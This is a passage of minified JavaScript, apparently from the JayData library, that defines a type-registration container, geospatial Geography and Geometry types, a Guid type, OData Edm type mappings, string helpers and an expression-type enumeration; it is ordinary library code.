this.createInstance=function(type,parameters){return IoC(type,parameters);};this.mapType=function(aliasTypeOrName,realTypeOrName){Guard.requireValue("aliasType",aliasTypeOrName);Guard.requireValue("realType",realTypeOrName);var aliasT=this.getType(aliasTypeOrName);var realT=this.getType(realTypeOrName);var aliasPos=classTypes.indexOf(aliasT);var realPos=classTypes.indexOf(realT);mappedTo[aliasPos]=realPos;},this.isPrimitiveType=function(type){var t=this.resolveType(type);switch(true){case t===Number:case t===String:case t===Date:case t===Boolean:case t===Array:case t===Object:case t===$data.Number:case t===$data.Integer:case t===$data.Date:case t===$data.String:case t===$data.Boolean:case t===$data.Array:case t===$data.Object:case t===$data.Guid:case t===$data.SimpleBase:case t===$data.Geospatial:case t===$data.Geography:case t===$data.GeographyPoint:case t===$data.GeographyLineString:case t===$data.GeographyPolygon:case t===$data.GeographyMultiPoint:case t===$data.GeographyMultiLineString:case t===$data.GeographyMultiPolygon:case t===$data.GeographyCollection:case t===$data.Geometry:case t===$data.GeometryPoint:case t===$data.GeometryLineString:case t===$data.GeometryPolygon:case t===$data.GeometryMultiPoint:case t===$data.GeometryMultiLineString:case t===$data.GeometryMultiPolygon:case t===$data.GeometryCollection:return true;default:return false;}};this.resolveName=function(type){var t=this.resolveType(type);var tPos=classTypes.indexOf(t);return consolidatedClassNames[tPos];};this.resolveType=function(typeOrName,onResolved){var t=typeOrName;t=this.getType(t,onResolved?true:false,onResolved);var posT=classTypes.indexOf(t);return typeof mappedTo[posT]==='undefined'?t:classTypes[mappedTo[posT]];};this.getType=function(typeOrName,doNotThrow,onResolved){Guard.requireValue("typeOrName",typeOrName);if(typeof typeOrName==='function'){return typeOrName;};if(!(typeOrName in classNames)){if(parent){var tp=parent.getType(typeOrName,true);if(tp)return tp;}
if(onResolved){addPendingResolution(typeOrName,onResolved);return;}
else if(doNotThrow){return undefined;}else{Guard.raise(new Exception("Unable to resolve type:"+typeOrName));}};var result=classTypes[classNames[typeOrName]];if(onResolved){onResolved(result);}
return result;};this.getName=function(typeOrName){var t=this.getType(typeOrName);var tPos=classTypes.indexOf(t);if(tPos==-1)
Guard.raise("unknown type to request name for: "+typeOrName);return consolidatedClassNames[tPos];};this.getTypes=function(){var keys=Object.keys(classNames);var ret=[];for(var i=0;i<keys.length;i++){var className=keys[i];ret.push({name:className,type:classTypes[classNames[className]],toString:function(){return this.name;}});}
return ret;};this.getTypeName=function(value){switch(typeof value){case'object':if(value==null)return'$data.Object';if(value instanceof Array)return'$data.Array';if(value.getType)return value.getType().fullName;if(value instanceof Date)return'$data.Date';if(value instanceof $data.GeographyPoint)return'$data.GeographyPoint';if(value instanceof $data.GeographyLineString)return'$data.GeographyLineString';if(value instanceof $data.GeographyPolygon)return'$data.GeographyPolygon';if(value instanceof $data.GeographyMultiPoint)return'$data.GeographyMultiPoint';if(value instanceof $data.GeographyMultiLineString)return'$data.GeographyMultiLineString';if(value instanceof $data.GeographyMultiPolygon)return'$data.GeographyMultiPolygon';if(value instanceof $data.GeographyCollection)return'$data.GeographyCollection';if(value instanceof $data.Geography)return'$data.Geography';if(value instanceof $data.GeometryPoint)return'$data.GeometryPoint';if(value instanceof $data.GeometryLineString)return'$data.GeometryLineString';if(value instanceof $data.GeometryPolygon)return'$data.GeometryPolygon';if(value instanceof $data.GeometryMultiPoint)return'$data.GeometryMultiPoint';if(value instanceof $data.GeometryMultiLineString)return'$data.GeometryMultiLineString';if(value instanceof $data.GeometryMultiPolygon)return'$data.GeometryMultiPolygon';if(value instanceof $data.GeometryCollection)return'$data.GeometryCollection';if(value instanceof $data.Geometry)return'$data.Geometry';if(value instanceof $data.Geospatial)return'$data.Geospatial';if(value instanceof $data.SimpleBase)return'$data.SimpleBase';if(value instanceof $data.Guid)return'$data.Guid';default:return typeof value;}};this.isTypeRegistered=function(typeOrName){if(typeof typeOrName==='function'){return classTypes.indexOf(typeOrName)>-1;}else{return typeOrName in classNames;}};this.unregisterType=function(type){Guard.raise("Unimplemented");};this.getDefault=function(typeOrName){var t=this.resolveType(typeOrName);switch(t){case $data.Number:return 0.0;case $data.Integer:return 0;case $data.String:return null;case $data.Boolean:return false;default:return null;}};this.registerType=function(nameOrNamesArray,type,factoryFunc){if(!nameOrNamesArray){return;}
if(typeof type==="string"){type=self.resolveType(type);}
var namesArray=[];if(typeof nameOrNamesArray==='string'){var tmp=[];tmp.push(nameOrNamesArray);namesArray=tmp;}else{namesArray=nameOrNamesArray;}
for(var i=0;i<namesArray.length;i++){var parts=namesArray[i].split('.');var item={};item.shortName=parts[parts.length-1];item.fullName=namesArray[i];namesArray[i]=item;}
var creatorFnc=function(){return IoC(type,arguments);};if(typeof intellisense!=='undefined'){intellisense.annotate(creatorFnc,type);}
for(var i=0,l=namesArray.length;i<l;i++){var item=namesArray[i];if(!(("create"+item.shortName)in self)){if(typeof factoryFunc==='function'){self["create"+item.shortName]=factoryFunc;}else{self["create"+item.shortName]=creatorFnc;}}
var typePos=classTypes.indexOf(type);if(typePos==-1){typePos=classTypes.push(type)-1;var fn=item.fullName;consolidatedClassNames[typePos]=item.fullName;};classNames[item.fullName]=typePos;var pending=pendingResolutions[item.fullName]||[];if(pending.length>0){pending.forEach(function(t){t(type);});pendingResolutions[item.fullName]=[];}}
if(parent){parent.registerType.apply(parent,arguments);}
if(!type.name){type.name=namesArray[0].shortName;}};}
$data.Number=typeof Number!=='undefined'?Number:function JayNumber(){};$data.Integer=typeof Integer!=='undefined'?Integer:function JayInteger(){};$data.Date=typeof Date!=='undefined'?Date:function JayDate(){};$data.String=typeof String!=='undefined'?String:function JayString(){};$data.Boolean=typeof Boolean!=='undefined'?Boolean:function JayBoolean(){};$data.Blob=function JayBlob(){};$data.Array=typeof Array!=='undefined'?Array:function JayArray(){};$data.Object=typeof Object!=='undefined'?Object:function JayObject(){};$data.ObjectID=typeof ObjectID!=='undefined'?ObjectID:function JayObjectID(){};$data.Function=Function;var c;global["Container"]=$data.Container=c=global["C$"]=new ContainerCtor();$data.createContainer=function(){return new ContainerCtor($data.Container);}
c.registerType(["$data.Number","number","float","real","decimal","JayNumber"],$data.Number);c.registerType(["$data.Integer","int","integer","int16","int32","int64","JayInteger"],$data.Integer);c.registerType(["$data.String","string","text","character","JayString"],$data.String);c.registerType(["$data.Array","array","Array","[]","JayArray"],$data.Array,function(){return $data.Array.apply(undefined,arguments);});c.registerType(["$data.Date","datetime","date","JayDate"],$data.Date);c.registerType(["$data.Boolean","bool","boolean","JayBoolean"],$data.Boolean);c.registerType(["$data.Blob","blob","JayBlob"],$data.Blob);c.registerType(["$data.Object","Object","object","{}","JayObject"],$data.Object);c.registerType(["$data.Function","Function","function"],$data.Function);c.registerType(['$data.ObjectID','ObjectID','objectId','objectid','ID','Id','id','JayObjectID'],$data.ObjectID);global["$C"]=function(){Class.define.apply(Class,arguments);};var storeProperty=function(memberDefinition,value){var backingFieldName="_"+memberDefinition.name;if(!this[backingFieldName]){Object.defineProperty(this,backingFieldName,memberDefinition.createStorePropertyDescriptor(value));}
else{this[backingFieldName]=value;}};var retrieveProperty=function(memberDefinition){var backingFieldName="_"+memberDefinition.name;return this[backingFieldName];};$data.Class.define('$data.Base',function Base(){},null,{storeProperty:storeProperty,retrieveProperty:retrieveProperty,setProperty:function(memberDefinition,value,callback){this[memberDefinition.name]=value;callback();},getProperty:function(memberDefinition,callback){callback.apply(this,[this[memberDefinition.name]]);}},{create:function(){return Container.createInstance(this,arguments);},extend:function(name,container,instanceDefinition,classDefinition){if(!(container instanceof ContainerCtor)){classDefinition=instanceDefinition;instanceDefinition=container;container=undefined;}
return $data.Class.define(name,this,container,instanceDefinition,classDefinition);},getMemberDefinition:function(name){return this.memberDefinitions.getMember(name);},addProperty:function(name,getterOrType,setterOrGetter,setter){var _getter=getterOrType;var _setter=setterOrGetter;var _type;if(typeof _getter==='string'){_type=getterOrType;_getter=setterOrGetter;_setter=setter;}
var propDef={notMapped:true,storeOnObject:true,get:typeof _getter==='function'?_getter:function(){},set:typeof _setter==='function'?_setter:function(){},type:_type};var memberDefinition=MemberDefinition.translateDefinition(propDef,name,this);$data.Class.buildMember(this,memberDefinition);this.memberDefinitions.clearCache();return this;},addMember:function(name,definition,isClassMember){var memberDefinition=MemberDefinition.translateDefinition(definition,name,this);if(isClassMember){memberDefinition.classMember=true;$data.Class.buildMember(this,memberDefinition,undefined,'staticDefinitions');this.staticDefinitions.clearCache();}else{$data.Class.buildMember(this,memberDefinition);this.memberDefinitions.clearCache();}
return this;},describeField:function(name,definition){var memDef=this.memberDefinitions.getMember(name);if(!memDef){this.addMember(name,definition);}else{Guard.raise(new Exception("Field '"+name+"' already defined!","Invalid operation"));}
return this;},storeProperty:storeProperty,retrieveProperty:retrieveProperty});$data.Class.ConstructorParameter=ConstructorParameter=$data.Class.define('ConstructorParameter',null,null,{constructor:function(paramIndex){this.paramIndex=paramIndex;},paramIndex:{}});})($data,window);$data.defaultErrorCallback=function(){if(arguments[arguments.length-1]&&typeof arguments[arguments.length-1].reject==='function'){arguments[arguments.length-1].reject.apply(arguments[arguments.length-1],arguments);}else{if(arguments[0]instanceof Error){Guard.raise(arguments[0]);}else{Guard.raise(new Exception("DEFAULT ERROR CALLBACK!","DefaultError",arguments));}}};$data.defaultSuccessCallback=function(){};$data.defaultNotifyCallback=function(){};$data.typeSystem={__namespace:true,extend:function(target){if(typeof target!=='object'&&typeof target!=='function')
Guard.raise('Target must be object or function');for(var i=1;i<arguments.length;i++){var obj=arguments[i];if(obj===null||typeof obj==='undefined')
continue;for(key in obj){target[key]=obj[key];}}
return target;},createCallbackSetting:function(callBack,defaultSetting){var setting={success:$data.defaultSuccessCallback,error:$data.defaultErrorCallback,notify:$data.defaultNotifyCallback};if(defaultSetting!=undefined&&defaultSetting!=null){setting=defaultSetting;}
if(callBack==null||callBack==undefined){return setting;}
if(typeof callBack=='function'){return this.extend(setting,{success:callBack});}
var clb=this.extend(setting,callBack);function wrapCode(fn){var t=this;function r(){fn.apply(t,arguments);fn=function(){}}return r;}
clb.error=wrapCode(clb.error);return clb;},createCtorParams:function(source,indexes,thisObj){if(indexes){var paramArray=[];for(var i=0,l=indexes.length;i<l;i++){var item=i;if(indexes[item]instanceof ConstructorParameter)
paramArray.push(source[indexes[item].paramIndex]);else if(typeof indexes[item]==="function")
paramArray.push(indexes[item].apply(thisObj));else
paramArray.push(indexes[item]);}
return paramArray;}
return source;},writePropertyValues:function(obj){if(obj&&obj.getType&&obj.getType().memberDefinitions){this.writeProperties(obj,obj.getType().memberDefinitions.asArray().filter(function(md){return(md.kind=="property"||md.kind=="navProperty"||md.kind=="complexProperty")&&!md.prototypeProperty;}));}},writeProperties:function(obj,members){var defines={};for(var i=0,l=members.length;i<l;i++){var memDef=members[i];defines[memDef.name]=memDef.createPropertyDescriptor(null,memDef.value);}
Object.defineProperties(obj,defines);},writeProperty:function(obj,member,value){var memDef=typeof member==='string'?obj.getType().memberDefinitions.getMember(member):member;if(memDef){var propDef=memDef.createPropertyDescriptor(null,value);Object.defineProperty(obj,memDef.name,propDef);}}};$data.debug=function(){console.log.apply(console,arguments);};$data.Class.define('$data.TraceBase',null,null,{log:function(){},warn:function(){},error:function(){}});$data.Trace=new $data.TraceBase();$data.Class.define('$data.Logger',$data.TraceBase,null,{log:function(){Array.prototype.unshift.call(arguments,this.getDateFormat());console.log.apply(console,arguments);},warn:function(){Array.prototype.unshift.call(arguments,this.getDateFormat());console.warn.apply(console,arguments);},error:function(){Array.prototype.unshift.call(arguments,this.getDateFormat());console.error.apply(console,arguments);},getDateFormat:function(){var date=new Date();return date.getHours()+':'+date.getMinutes()+':'+date.getSeconds()+'.'+date.getMilliseconds();}});$data.SimpleBase=function SimpleBase(data){if(typeof data==='object'&&data){if(Array.isArray(this.constructor.validMembers)){for(var i=0;i<this.constructor.validMembers.length;i++){var name=this.constructor.validMembers[i];if(data[name]!==undefined){this[name]=data[name];}}}else{delete data.type;$data.typeSystem.extend(this,data);}}}
$data.SimpleBase.registerType=function(name,type,base){base=base||$data.SimpleBase;type.type=name;type.prototype=Object.create(base.prototype);type.prototype.constructor=type;}
$data.Container.registerType(['$data.SimpleBase','SimpleBase'],$data.SimpleBase);$data.Geospatial=function Geospatial(){this.type=this.constructor.type;if(Array.isArray(this.constructor.validMembers)){for(var i=0;i<this.constructor.validMembers.length;i++){var name=this.constructor.validMembers[i];this[name]=undefined;}}
$data.SimpleBase.apply(this,arguments);this.type=this.constructor.type||'InvalidType';};$data.SimpleBase.registerType('Geospatial',$data.Geospatial);$data.Container.registerType(['$data.Geospatial','Geospatial'],$data.Geospatial);$data.Geography=function Geography(){$data.Geospatial.apply(this,arguments);};$data.Geography.parseFromString=function(strData){var lparenIdx=strData.indexOf('(');if(lparenIdx>=0){var name=strData.substring(0,lparenIdx).toLowerCase();var type=$data.Geography.registered[name];if(type&&type.parseFromString&&type!=$data.Geography){return type.parseFromString(strData);}else{Guard.raise(new Exception('parseFromString','Not Implemented',strData));}}};$data.Geography.stringifyToUrl=function(geoData){if(geoData instanceof $data.Geography&&geoData.constructor&&geoData.constructor.stringifyToUrl){return geoData.constructor.stringifyToUrl(geoData);}else if(geoData instanceof $data.Geography&&geoData.constructor&&Array.isArray(geoData.constructor.validMembers)&&geoData.constructor.validMembers.length===1&&geoData.constructor.validMembers[0]==='coordinates'){var data="geography'"+geoData.type.toUpperCase()+'(';function buildArray(d,context){if(Array.isArray(d[0])){for(var i=0;i<d.length;i++){if(i>0)data+=',';if(Array.isArray(d[i][0]))
data+='(';buildArray(d[i]);if(Array.isArray(d[i][0]))
data+=')';}}else{data+=d.join(' ');}}
buildArray(geoData.coordinates,data);data+=")'";return data;}else{Guard.raise(new Exception('stringifyToUrl on instance type','Not Implemented',geoData));}};$data.Geography.registerType=function(name,type,base){$data.SimpleBase.registerType(name,type,base||$data.Geography);$data.Geography.registered=$data.Geography.registered||{};$data.Geography.registered[name.toLowerCase()]=type;};$data.SimpleBase.registerType('Geography',$data.Geography,$data.Geospatial);$data.Container.registerType(['$data.Geography'],$data.Geography);$data.GeographyPoint=function GeographyPoint(lon,lat){if(lon&&typeof lon==='object'&&Array.isArray(lon)){$data.Geography.call(this,{coordinates:lon});}else if(lon&&typeof lon==='object'){$data.Geography.call(this,lon);}else{$data.Geography.call(this,{coordinates:[lon||0,lat||0]});}};$data.GeographyPoint.parseFromString=function(strData){var data=strData.substring(strData.indexOf('(')+1,strData.lastIndexOf(')'));var values=data.split(' ');return new $data.GeographyPoint(parseFloat(values[0]),parseFloat(values[1]));};$data.GeographyPoint.validMembers=['coordinates'];$data.Geography.registerType('Point',$data.GeographyPoint);Object.defineProperty($data.GeographyPoint.prototype,'longitude',{get:function(){return this.coordinates[0];},set:function(v){this.coordinates[0]=v;}});Object.defineProperty($data.GeographyPoint.prototype,'latitude',{get:function(){return this.coordinates[1];},set:function(v){this.coordinates[1]=v;}});$data.Container.registerType(['$data.GeographyPoint','GeographyPoint'],$data.GeographyPoint);$data.GeographyLineString=function GeographyLineString(data){if(Array.isArray(data)){$data.Geography.call(this,{coordinates:data});}else{$data.Geography.call(this,data);}};$data.GeographyLineString.validMembers=['coordinates'];$data.Geography.registerType('LineString',$data.GeographyLineString);$data.Container.registerType(['$data.GeographyLineString','GeographyLineString'],$data.GeographyLineString);$data.GeographyPolygon=function GeographyPolygon(data){if(Array.isArray(data)){$data.Geography.call(this,{coordinates:data});}else{$data.Geography.call(this,data);}};$data.GeographyPolygon.validMembers=['coordinates'];$data.Geography.registerType('Polygon',$data.GeographyPolygon);$data.Container.registerType(['$data.GeographyPolygon','GeographyPolygon'],$data.GeographyPolygon);$data.GeographyMultiPoint=function GeographyMultiPoint(data){if(Array.isArray(data)){$data.Geography.call(this,{coordinates:data});}else{$data.Geography.call(this,data);}};$data.GeographyMultiPoint.validMembers=['coordinates'];$data.Geography.registerType('MultiPoint',$data.GeographyMultiPoint);$data.Container.registerType(['$data.GeographyMultiPoint','GeographyMultiPoint'],$data.GeographyMultiPoint);$data.GeographyMultiLineString=function GeographyMultiLineString(data){if(Array.isArray(data)){$data.Geography.call(this,{coordinates:data});}else{$data.Geography.call(this,data);}};$data.GeographyMultiLineString.validMembers=['coordinates'];$data.Geography.registerType('MultiLineString',$data.GeographyMultiLineString);$data.Container.registerType(['$data.GeographyMultiLineString','GeographyMultiLineString'],$data.GeographyMultiLineString);$data.GeographyMultiPolygon=function GeographyMultiPolygon(data){if(Array.isArray(data)){$data.Geography.call(this,{coordinates:data});}else{$data.Geography.call(this,data);}};$data.GeographyMultiPolygon.validMembers=['coordinates'];$data.Geography.registerType('MultiPolygon',$data.GeographyMultiPolygon);$data.Container.registerType(['$data.GeographyMultiPolygon','GeographyMultiPolygon'],$data.GeographyMultiPolygon);$data.GeographyCollection=function GeographyCollection(data){$data.Geography.call(this,data);};$data.Geography.registerType('Collection',$data.GeographyCollection);$data.Container.registerType(['$data.GeographyCollection','GeographyCollection'],$data.GeographyCollection);$data.Geometry=function Geometry(){$data.Geospatial.apply(this,arguments);};$data.Geometry.parseFromString=function(strData){var lparenIdx=strData.indexOf('(');if(lparenIdx>=0){var name=strData.substring(0,lparenIdx).toLowerCase();var type=$data.Geometry.registered[name];if(type&&type.parseFromString&&type!=$data.Geometry){return type.parseFromString(strData);}else{Guard.raise(new Exception('parseFromString','Not Implemented',strData));}}};$data.Geometry.stringifyToUrl=function(geoData){if(geoData instanceof $data.Geometry&&geoData.constructor&&geoData.constructor.stringifyToUrl){return geoData.constructor.stringifyToUrl(geoData);}else if(geoData instanceof $data.Geometry&&geoData.constructor&&Array.isArray(geoData.constructor.validMembers)&&geoData.constructor.validMembers.length===1&&geoData.constructor.validMembers[0]==='coordinates'){var data="geometry'"+geoData.type.toUpperCase()+'(';function buildArray(d,context){if(Array.isArray(d[0])){for(var i=0;i<d.length;i++){if(i>0)data+=',';if(Array.isArray(d[i][0]))
data+='(';buildArray(d[i]);if(Array.isArray(d[i][0]))
data+=')';}}else{data+=d.join(' ');}}
buildArray(geoData.coordinates,data);data+=")'";return data;}else{Guard.raise(new Exception('stringifyToUrl on instance type','Not Implemented',geoData));}};$data.Geometry.registerType=function(name,type,base){$data.SimpleBase.registerType(name,type,base||$data.Geometry);$data.Geometry.registered=$data.Geometry.registered||{};$data.Geometry.registered[name.toLowerCase()]=type;};$data.SimpleBase.registerType('Geometry',$data.Geometry,$data.Geospatial);$data.Container.registerType(['$data.Geometry'],$data.Geometry);$data.GeometryPoint=function GeometryPoint(lon,lat){if(lon&&typeof lon==='object'&&Array.isArray(lon)){$data.Geometry.call(this,{coordinates:lon});}else if(lon&&typeof lon==='object'){$data.Geometry.call(this,lon);}else{$data.Geometry.call(this,{coordinates:[lon||0,lat||0]});}};$data.GeometryPoint.parseFromString=function(strData){var data=strData.substring(strData.indexOf('(')+1,strData.lastIndexOf(')'));var values=data.split(' ');return new $data.GeometryPoint(parseFloat(values[0]),parseFloat(values[1]));};$data.GeometryPoint.validMembers=['coordinates'];$data.Geometry.registerType('Point',$data.GeometryPoint);Object.defineProperty($data.GeometryPoint.prototype,'x',{get:function(){return this.coordinates[0];},set:function(v){this.coordinates[0]=v;}});Object.defineProperty($data.GeometryPoint.prototype,'y',{get:function(){return this.coordinates[1];},set:function(v){this.coordinates[1]=v;}});$data.Container.registerType(['$data.GeometryPoint','GeometryPoint'],$data.GeometryPoint);$data.GeometryLineString=function GeometryLineString(data){if(Array.isArray(data)){$data.Geometry.call(this,{coordinates:data});}else{$data.Geometry.call(this,data);}};$data.GeometryLineString.validMembers=['coordinates'];$data.Geometry.registerType('LineString',$data.GeometryLineString);$data.Container.registerType(['$data.GeometryLineString','GeometryLineString'],$data.GeometryLineString);$data.GeometryPolygon=function GeometryPolygon(data){if(Array.isArray(data)){$data.Geometry.call(this,{coordinates:data});}else{$data.Geometry.call(this,data);}};$data.GeometryPolygon.validMembers=['coordinates'];$data.Geometry.registerType('Polygon',$data.GeometryPolygon);$data.Container.registerType(['$data.GeometryPolygon','GeometryPolygon'],$data.GeometryPolygon);$data.GeometryMultiPoint=function GeometryMultiPoint(data){if(Array.isArray(data)){$data.Geometry.call(this,{coordinates:data});}else{$data.Geometry.call(this,data);}};$data.GeometryMultiPoint.validMembers=['coordinates'];$data.Geometry.registerType('MultiPoint',$data.GeometryMultiPoint);$data.Container.registerType(['$data.GeometryMultiPoint','GeometryMultiPoint'],$data.GeometryMultiPoint);$data.GeometryMultiLineString=function GeometryMultiLineString(data){if(Array.isArray(data)){$data.Geometry.call(this,{coordinates:data});}else{$data.Geometry.call(this,data);}};$data.GeometryMultiLineString.validMembers=['coordinates'];$data.Geometry.registerType('MultiLineString',$data.GeometryMultiLineString);$data.Container.registerType(['$data.GeometryMultiLineString','GeometryMultiLineString'],$data.GeometryMultiLineString);$data.GeometryMultiPolygon=function GeometryMultiPolygon(data){if(Array.isArray(data)){$data.Geometry.call(this,{coordinates:data});}else{$data.Geometry.call(this,data);}};$data.GeometryMultiPolygon.validMembers=['coordinates'];$data.Geometry.registerType('MultiPolygon',$data.GeometryMultiPolygon);$data.Container.registerType(['$data.GeometryMultiPolygon','GeometryMultiPolygon'],$data.GeometryMultiPolygon);$data.GeometryCollection=function GeometryCollection(data){$data.Geometry.call(this,data);};$data.Geometry.registerType('Collection',$data.GeometryCollection);$data.Container.registerType(['$data.GeometryCollection','GeometryCollection'],$data.GeometryCollection);$data.Guid=function Guid(value){if(value===undefined||(typeof value==='string'&&/^[a-zA-z0-9]{8}-[a-zA-z0-9]{4}-[a-zA-z0-9]{4}-[a-zA-z0-9]{4}-[a-zA-z0-9]{12}$/.test(value))){this.value=value||'00000000-0000-0000-0000-000000000000';}else{throw Guard.raise(new Exception('TypeError: ','value not convertable to $data.Guid',value));}};$data.Container.registerType(['$data.Guid','Guid','guid'],$data.Guid);$data.Guid.prototype.toJSON=function(){return this.value;};$data.Guid.prototype.valueOf=function(){return this.value;};$data.Guid.prototype.toString=function(){return this.value;};$data.Guid.NewGuid=function(){return $data.createGuid();};$data.parseGuid=function(guid){return new $data.Guid(guid);};(function(){var CHARS='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.split('');$data.createGuid=function(guidString){if(guidString){return new $data.Guid(guidString);};var len;var chars=CHARS,uuid=[],i;var radix=chars.length;if(len){for(i=0;i<len;i++)uuid[i]=chars[0|Math.random()*radix];}else{var r;uuid[8]=uuid[13]=uuid[18]=uuid[23]='-';uuid[14]='4';for(i=0;i<36;i++){if(!uuid[i]){r=0|Math.random()*16;uuid[i]=chars[(i==19)?(r&0x3)|0x8:r];}}}
return $data.parseGuid(uuid.join(''));};})();(function($data){function Edm_Boolean(){};$data.Container.registerType('Edm.Boolean',Edm_Boolean);$data.Container.mapType(Edm_Boolean,$data.Boolean);function Edm_Binary(){};$data.Container.registerType('Edm.Binary',Edm_Binary);$data.Container.mapType(Edm_Binary,$data.Blob);function Edm_DateTime(){};$data.Container.registerType('Edm.DateTime',Edm_DateTime);$data.Container.mapType(Edm_DateTime,$data.Date);function Edm_DateTimeOffset(){};$data.Container.registerType('Edm.DateTimeOffset',Edm_DateTimeOffset);$data.Container.mapType(Edm_DateTimeOffset,$data.Integer);function Edm_Time(){};$data.Container.registerType('Edm.Time',Edm_Time);$data.Container.mapType(Edm_Time,$data.Integer);function Edm_Decimal(){};$data.Container.registerType('Edm.Decimal',Edm_Decimal);$data.Container.mapType(Edm_Decimal,$data.String);function Edm_Single(){};$data.Container.registerType('Edm.Single',Edm_Single);$data.Container.mapType(Edm_Single,$data.Number);function Edm_Double(){};$data.Container.registerType('Edm.Double',Edm_Double);$data.Container.mapType(Edm_Double,$data.Number);function Edm_Guid(){};$data.Container.registerType('Edm.Guid',Edm_Guid);$data.Container.mapType(Edm_Guid,$data.Guid);function Edm_Int16(){};$data.Container.registerType('Edm.Int16',Edm_Int16);$data.Container.mapType(Edm_Int16,$data.Integer);function Edm_Int32(){};$data.Container.registerType('Edm.Int32',Edm_Int32);$data.Container.mapType(Edm_Int32,$data.Integer);function Edm_Int64(){};$data.Container.registerType('Edm.Int64',Edm_Int64);$data.Container.mapType(Edm_Int64,$data.Integer);function Edm_Byte(){};$data.Container.registerType('Edm.Byte',Edm_Byte);$data.Container.mapType(Edm_Byte,$data.Integer);function Edm_String(){};$data.Container.registerType('Edm.String',Edm_String);$data.Container.mapType(Edm_String,$data.String);function Edm_GeographyPoint(){};$data.Container.registerType('Edm.GeographyPoint',Edm_GeographyPoint);$data.Container.mapType(Edm_GeographyPoint,$data.GeographyPoint);function Edm_GeographyLineString(){};$data.Container.registerType('Edm.GeographyLineString',Edm_GeographyLineString);$data.Container.mapType(Edm_GeographyLineString,$data.GeographyLineString);function Edm_GeographyPolygon(){};$data.Container.registerType('Edm.GeographyPolygon',Edm_GeographyPolygon);$data.Container.mapType(Edm_GeographyPolygon,$data.GeographyPolygon);function Edm_GeographyMultiPoint(){};$data.Container.registerType('Edm.GeographyMultiPoint',Edm_GeographyMultiPoint);$data.Container.mapType(Edm_GeographyMultiPoint,$data.GeographyMultiPoint);function Edm_GeographyMultiLineString(){};$data.Container.registerType('Edm.GeographyMultiLineString',Edm_GeographyMultiLineString);$data.Container.mapType(Edm_GeographyMultiLineString,$data.GeographyMultiLineString);function Edm_GeographyMultiPolygon(){};$data.Container.registerType('Edm.GeographyMultiPolygon',Edm_GeographyMultiPolygon);$data.Container.mapType(Edm_GeographyMultiPolygon,$data.GeographyMultiPolygon);function Edm_GeographyCollection(){};$data.Container.registerType('Edm.GeographyCollection',Edm_GeographyCollection);$data.Container.mapType(Edm_GeographyCollection,$data.GeographyCollection);function Edm_GeometryPoint(){};$data.Container.registerType('Edm.GeometryPoint',Edm_GeometryPoint);$data.Container.mapType(Edm_GeometryPoint,$data.GeometryPoint);function Edm_GeometryLineString(){};$data.Container.registerType('Edm.GeometryLineString',Edm_GeometryLineString);$data.Container.mapType(Edm_GeometryLineString,$data.GeometryLineString);function Edm_GeometryPolygon(){};$data.Container.registerType('Edm.GeometryPolygon',Edm_GeometryPolygon);$data.Container.mapType(Edm_GeometryPolygon,$data.GeometryPolygon);function Edm_GeometryMultiPoint(){};$data.Container.registerType('Edm.GeometryMultiPoint',Edm_GeometryMultiPoint);$data.Container.mapType(Edm_GeometryMultiPoint,$data.GeometryMultiPoint);function Edm_GeometryMultiLineString(){};$data.Container.registerType('Edm.GeometryMultiLineString',Edm_GeometryMultiLineString);$data.Container.mapType(Edm_GeometryMultiLineString,$data.GeometryMultiLineString);function Edm_GeometryMultiPolygon(){};$data.Container.registerType('Edm.GeometryMultiPolygon',Edm_GeometryMultiPolygon);$data.Container.mapType(Edm_GeometryMultiPolygon,$data.GeometryMultiPolygon);function Edm_GeometryCollection(){};$data.Container.registerType('Edm.GeometryCollection',Edm_GeometryCollection);$data.Container.mapType(Edm_GeometryCollection,$data.GeometryCollection);})($data);$data.StringFunctions={startsWith:function(){var self,str;if(arguments.length==2){self=arguments[0];str=arguments[1];}else if(arguments.length==1&&typeof this==='string'){self=this;str=arguments[0];}else if(this instanceof String){self=this.valueOf();str=arguments[0];}else
return false;;return self.indexOf(str)===0;},endsWith:function(){var self,str;if(arguments.length==2){self=arguments[0];str=arguments[1];}else if(arguments.length==1&&typeof this==='string'){self=this;str=arguments[0];}else if(this instanceof String){self=this.valueOf();str=arguments[0];}else
return false;return self.slice(-str.length)===str;},contains:function(){var self,str;if(arguments.length==2){self=arguments[0];str=arguments[1];}else if(arguments.length==1&&typeof this==='string'){self=this;str=arguments[0];}else if(this instanceof String){self=this.valueOf();str=arguments[0];}else
return false;return self.indexOf(str)>=0;}};$data.ASTNode=function(){}
$data.FunctionASTNode=function(){}
$data.FunctionASTNode.prototype=new $data.ASTNode();$data.ParameterASTNode=function(){}
$data.MemberAccessASTNode=function(){}
$data.MemberAccessASTNode.prototype=new $data.ASTNode();$data.ConstantASTNode=function(){}
$data.ASTParserResult=function(result,tree,errors){this.success=(tree!='');this.result=result;this.tree=tree;this.errors=errors;}
$data.ASTParser=function(){}
$data.ASTParser.parseCode=function(code){var codeStr;if(!code||(codeStr=code.toString())===''){return new $data.ASTParserResult(false,null,null);}
if(typeof JAYLINT==='undefined'){Guard.raise(new Exception('JAYLINT is required','Not Found!'));}
var jsLint=JAYLINT(codeStr);var result=new $data.ASTParserResult(jsLint,JAYLINT.tree,JAYLINT.errors);return result;};$data.Class.define("$data.Expressions.ExpressionType",null,null,{},{Constant:"constant",Variable:"variable",MemberAccess:"memberAccess",Call:"call",Equal:"equal",NotEqual:"notEqual",EqualTyped:"equalTyped",NotEqualTyped:"notEqualTyped",GreaterThen:"greaterThan",LessThen:"lessThan",GreaterThenOrEqual:"greaterThanOrEqual",LessThenOrEqual:"lessThenOrEqual",Or:"or",OrBitwise:"orBitwise",And:"and",AndBitwise:"andBitwise",In:"in",Add:"add",Divide:"divide",Multiply:"multiply",Subtract:"subtract",Modulo:"modulo",ArrayIndex:"arrayIndex",New:"new",Positive:"positive",Negative:"negative",Increment:"increment",Decrement:"decrement",Not:"not",This:"this",LambdaParameterReference:"lambdaParameterReference",LambdaParameter:"lambdaParameter",Parameter:"parameter",ArrayLiteral:"arrayLiteral",ObjectLiteral:"objectLiteral",ObjectField:"objectField",Function:"Function",Unknown:"UNKNOWN",EntitySet:"EntitySet",ServiceOperation:"ServiceOperation",EntityField:"EntityField",EntityContext:"EntityContext",Entity:"Entity",Filter:"Filter",First:"First",Count:"Count",InlineCount:"InlineCount",Single:"Single",Some:"Some",Every:"Every",ToArray:"ToArray",BatchDelete:"BatchDelete",ForEach:"ForEach",Projection:"Projection",EntityMember:"EntityMember",EntityFieldOperation:"EntityFieldOperation",FrameOperation:"FrameOperation",Enti